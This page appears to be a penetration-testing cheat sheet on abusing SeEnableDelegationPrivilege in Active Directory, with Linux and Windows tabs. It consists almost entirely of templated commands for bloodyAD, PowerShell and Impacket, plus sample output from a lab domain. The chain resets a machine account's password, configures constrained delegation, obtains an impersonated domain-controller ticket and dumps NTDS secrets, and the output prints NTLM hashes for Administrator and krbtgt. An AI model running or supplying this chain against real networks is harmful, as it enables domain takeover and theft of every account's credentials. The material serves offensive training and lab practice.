---
title: "SeEnableDelegationPrivilege"
date: 2025-7-19
tags: ["SeEnableDelegationPrivilege", "Pass-The-Ticket", "Service Ticket", "Ticket Granting Ticket", "Constrained Delegation", "Active Directory", "Windows", "KCD", "secretsdump"]
---

### Abuse #1: Constrained Delegation

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Control of a Machine Account

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d REDELEGATE.VL -u 'HELEN.FROST' -p 'Fall2024!' --host DC.REDELEGATE.VL set password 'FS01$' 'Fall2024!'
[+] Password changed successfully!
```

#### 2. Set msDS-AllowedToDelegateTo to Target SPN

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v 'ldap/<DC>'
```

```console {class="sample-code"}
$ bloodyAD -u 'HELEN.FROST' -p 'Fall2024!' -d 'REDELEGATE.VL' --host 'dc.redelegate.vl' set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```

#### 3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -u 'HELEN.FROST' -p 'Fall2024!' -d 'REDELEGATE.VL' --host 'dc.redelegate.vl' add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

#### 4. Request a Service Ticket

```console
impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -spn 'ldap/<DC>' -impersonate DC
```

```console {class="sample-code"}
$ impacket-getST 'redelegate.vl/fs01$:Fall2024!' -spn ldap/dc.redelegate.vl -impersonate DC
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

#### 5. Secretsdump

```console
# Import Ticket
export KRB5CCNAME=DC@ldap_<DC>@<DOMAIN>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console
# Secretsdump
sudo ntpdate -s <DC_IP> && impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.50 && impacket-secretsdump -k -no-pass DC.REDELEGATE.VL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Control of a Machine Account

```console
Set-ADAccountPassword -Identity "<TARGET_MACHINE>$" -Reset -NewPassword (ConvertTo-SecureString "<NEW_PASSWORD>" -AsPlainText -Force)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountPassword -Identity "FS01$" -Reset -NewPassword (ConvertTo-SecureString "Fall2024!" -AsPlainText -Force)
```

#### 2. Set msDS-AllowedToDelegateTo to Target SPN

```console
Set-ADObject -Identity "CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>" -Add @{"msDS-AllowedToDelegateTo"="ldap/<DC>"}
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
```

#### 3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

```console
Set-ADAccountControl -Identity "<TARGET_MACHINE>$" -TrustedToAuthForDelegation $True
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

#### 4. Request a Service Ticket

```console
impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -spn 'ldap/<DC>' -impersonate DC
```

```console {class="sample-code"}
$ impacket-getST 'redelegate.vl/fs01$:Fall2024!' -spn ldap/dc.redelegate.vl -impersonate DC
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

#### 5. Secretsdump

```console
# Import Ticket
export KRB5CCNAME=DC@ldap_<DC>@<DOMAIN>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console
# Secretsdump
sudo ntpdate -s <DC_IP> && impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.50 && impacket-secretsdump -k -no-pass DC.REDELEGATE.VL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}